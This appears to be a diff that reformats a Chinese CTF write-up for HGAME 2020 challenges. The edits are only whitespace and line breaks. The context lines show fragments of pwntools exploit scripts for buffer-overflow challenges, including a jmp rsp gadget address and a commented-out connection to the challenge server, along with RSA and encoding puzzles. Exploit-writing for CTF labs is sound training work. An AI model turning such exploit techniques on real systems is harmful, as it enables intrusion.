@@ -239,6 +239,7 @@ for i in part2:
 > 描述
 >
 > 无脑AAA太无聊了，挑战更高难度的无脑AAA！
+>
 > nc 47.103.214.163 20000
 >
 > 题目地址 链接:https://pan.baidu.com/s/19SbtWLIt8gdzpwlbOjfbwQ  密码:sxdq
@@ -264,8 +265,10 @@ for i in part2:
 写exp
 
 ```python
-#!/usr/bin/env python2  
+#!/usr/bin/env python2 
+
 # -*- coding: utf-8 -*-  
+
 from pwn import *  
 
 p = process('./aaa')
@@ -286,6 +289,7 @@ p.interactive()
 >描述
 >
 >看起来人畜无害的一些整数也能秒我？(吃惊)
+>
 >nc 47.103.214.163 20001
 >
 >题目地址 链接:https://pan.baidu.com/s/1Lpu5XWSz-_cloWBtWJ5Fzg  密码:cpdj
@@ -330,14 +334,18 @@ py了一下**@幼稚园**学长以后得到学长的hint，内存的本质都是
 
 ```python
 #!/usr/bin/env python2  
+
 # -*- coding: utf-8 -*-  
+
 from pwn import *
 
 p = process('./num')
 #p = remote("47.103.214.163",  20001)
+
 gdb.attach(p,'b *0x4006DA')
 
 jmp_rsp = '4196237'  #0x40078D
+
 over = '51539607552' #0xc00000000
 
 p.recvuntil('numbers!\n')
@@ -380,6 +388,7 @@ p.interactive()
 >描述
 >
 >一发入魂
+>
 >nc 47.103.214.163 20002
 >
 >题目地址 链接:https://pan.baidu.com/s/1FFZ9GdYNm26bZ5YoLJRFgQ  密码:42z0
@@ -410,11 +419,14 @@ p.interactive()
 
 ```python
 #!/usr/bin/env python2  
+
 # -*- coding: utf-8 -*-  
+
 from pwn import *
 
 p = process('./one')
 #p = remote("47.103.214.163",  20002)
+
 gdb.attach(p,'b *0x04007FB')
 
 p.recvuntil('name?\n')
@@ -504,9 +516,13 @@ p.interactive()
 >描述
 >
 >真*签到题
+>
 >p = 681782737450022065655472455411;
+>
 >q = 675274897132088253519831953441;
+>
 >e = 13;
+>
 >c = pow(m,e,p*q) = 275698465082361070145173688411496311542172902608559859019841
 >
 >题目地址 [https://paste.ubuntu.com/p/9hVzhnxqPc/](https://paste.ubuntu.com/p/9hVzhnxqPc/)
@@ -545,6 +561,7 @@ print(hex(m))
 >描述
 >
 >We found a secret oracle and it looks like it will encrypt your input…
+>
 >nc 0 1234
 >
 >题目地址 [https://www.baidu.com](https://www.baidu.com/)
@@ -571,7 +588,8 @@ nc连接发现会把输入的字符打乱，直接回车会弹出可疑字符(�
 >
 >欢迎大家参加 HGAME 2020！
 >来来来，签个到吧～
->Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t
+>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0g
+>Li4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t
 >注：若解题得到的是无`hgame{}`字样的flag花括号内内容，请手动添加`hgame{}`后提交。
 >【Notice】解出来的字母均为大写
 >
